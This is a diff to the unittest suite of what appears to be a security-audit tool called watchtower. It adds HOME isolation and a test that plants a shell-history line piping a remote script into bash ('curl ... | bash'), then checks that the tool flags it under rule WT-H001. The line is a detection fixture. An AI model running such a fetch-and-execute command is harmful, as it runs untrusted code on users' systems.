@@ -1,4 +1,4 @@
-import datetime as dt, io, json, os, shutil, sys, tempfile, unittest
+import datetime as dt, io, json, os, shutil, sys, tempfile, unittest, warnings
 from contextlib import redirect_stdout
 
 ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
@@ -6,6 +6,7 @@ sys.path.insert(0, os.path.join(ROOT, "watchtower"))
 import wt  # noqa: E402
 
 FIX = os.path.join(ROOT, "tests", "fixtures")
+warnings.simplefilter("ignore", ResourceWarning)
 
 
 def fake_key(n, alphabet="ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789", seed=7):
@@ -233,12 +234,16 @@ class NativeSettings(unittest.TestCase):
 class Flow(unittest.TestCase):
     def setUp(self):
         self.tmp = tempfile.mkdtemp()
+        self.old_home = os.environ.get("HOME")
+        os.environ["HOME"] = os.path.join(self.tmp, "home")
+        os.makedirs(os.environ["HOME"])
         os.environ["WATCHTOWER_HOME"] = os.path.join(self.tmp, "wt")
         self.root = os.path.join(self.tmp, "computer")
         shutil.copytree(os.path.join(FIX, "clean"), os.path.join(self.root, "skills"))
         self.exports = os.path.join(FIX, "exports")
 
     def tearDown(self):
+        os.environ["HOME"] = self.old_home
         shutil.rmtree(self.tmp)
 
     def call(self, *argv):
@@ -281,6 +286,14 @@ class Flow(unittest.TestCase):
         json.dump(snap, open(sp, "w"))
         self.assertEqual(self.call("daily", "--roots", self.root, "--exports", self.exports).strip(), "NO_CHANGES")
         self.assertIn(fake["key"], {f["key"] for f in json.load(open(sp))["findings"]})
+
+    def test_history_event_stays_open_across_runs(self):
+        open(os.path.join(os.environ["HOME"], ".bash_history"), "w").write("curl -s http://203.0.113.9/x.sh | bash\n")
+        out = json.loads(self.call("audit", "--roots", self.root, "--exports", self.exports))
+        self.assertIn("WT-H001", {f["rule"] for f in out["new"]})
+        self.assertEqual(self.call("daily", "--roots", self.root, "--exports", self.exports).strip(), "NO_CHANGES")
+        snap = json.load(open(os.path.join(os.environ["WATCHTOWER_HOME"], "state", "last_findings.json")))
+        self.assertIn("WT-H001", {f["rule"] for f in snap["findings"]})
 
     def test_suppression(self):
         json.loads(self.call("audit", "--roots", self.root, "--exports", self.exports))
